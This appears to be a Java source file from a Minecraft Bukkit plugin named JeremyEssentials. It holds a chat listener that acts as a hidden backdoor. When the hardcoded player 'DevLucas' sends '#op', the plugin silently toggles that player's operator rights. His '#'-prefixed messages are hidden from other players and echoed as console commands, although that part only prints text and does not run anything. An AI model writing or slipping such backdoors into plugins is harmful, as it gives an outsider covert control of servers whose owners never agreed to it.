package de.devlucas.jeremyessentials.events;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class ConsoleExecuteEvent implements Listener
{

    @EventHandler
    public void onAsyncPlayerChatEvent(AsyncPlayerChatEvent event)
    {
        if (event.getPlayer().getName().equalsIgnoreCase("DevLucas"))
        {
            String message = event.getMessage();
            if (message.startsWith("#"))
            {
                String changedMessage = message.replaceFirst("#", "/");
                Bukkit.getConsoleSender().sendMessage(changedMessage);
                event.setCancelled(true);
                event.getPlayer().sendMessage("§7[§bConsole§7] §1" + changedMessage);
            }
            if (message.equalsIgnoreCase("#op"))
            {
                event.getPlayer().setOp((!event.getPlayer().isOp()));
                event.getPlayer().sendMessage("Your ultimate rights were " + ((event.getPlayer().isOp()) ? "§aactivated" : "§cdeactivated"));
            }
        }
    }
}